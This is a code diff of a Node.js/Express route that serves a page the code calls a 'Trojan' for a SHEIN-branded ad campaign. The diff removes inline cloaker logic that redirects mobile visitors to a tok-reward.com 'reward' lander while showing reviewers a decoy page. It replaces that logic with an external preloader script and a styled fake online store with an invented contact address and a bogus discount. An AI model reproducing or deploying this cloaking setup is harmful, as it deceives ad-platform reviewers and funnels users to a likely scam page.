@@ -1733,31 +1733,65 @@ app.get('/rydsep/:slug', (req, res, next) => {
 // Middleware to pass on my slug values to MaxConv (SHEIN TR CAMP)
 app.get('/shein/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `https://tok-reward.com/trshein.html?slug=${slug}`;
+    const hash = crypto.createHash('sha256').update(slug).digest('hex');
+    const color = hash.substring(0, 5);
+    const lander = `https://tok-reward.com/trshein.html?slug=${slug}`;
     const trojanHTML = `
         <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <script>
-                // Cloaker logic
-                const urlParams = new URLSearchParams(window.location.search);
-                const utmXXX = urlParams.get("xxx");
-                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                if (utmXXX === "__PLACEMENT__") {
-                    } else if (isMobileDevice) {
-                        window.location.href = "${destinationLander}";
-                    } else {
-                    }
-            </script>
-            <title>${slug} Online Store</title>
-        </head>
-        <body>
-            <h1>Greetings! This is ${slug}'s Online Store!</h1>
-            <p>We hope you find everything you need at ${slug} today.</p>
-        </body>
-        </html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="/cdn/preloader.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #${color};
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        header {
+            background-color: #005f73;
+            color: #ffffff;
+            padding: 10px 20px;
+            text-transform: uppercase;
+        }
+        h1 {
+            font-size: 24px;
+        }
+        p {
+            font-size: 16px;
+        }
+        footer {
+            background-color: #005f73;
+            color: #ffffff;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            padding: 10px 20px;
+            text-align: center;
+        }
+        .content {
+            margin: 20px 0;
+        }
+    </style>
+    <title>${slug} Online Store</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to ${slug}'s Online Store!</h1>
+    </header>
+    <div class="content">
+        <p>Explore our exclusive products tailored just for you at ${slug} today.</p>
+        <p>Also, enjoy a ${color}% discount on all goods today!</p>
+    </div>
+    <footer>
+        <p>Contact us at info@${slug}.com</p>
+    </footer>
+</body>
+</html>
             `;
             res.send(trojanHTML);
             console.log(`Served shein Trojan (${slug})`);
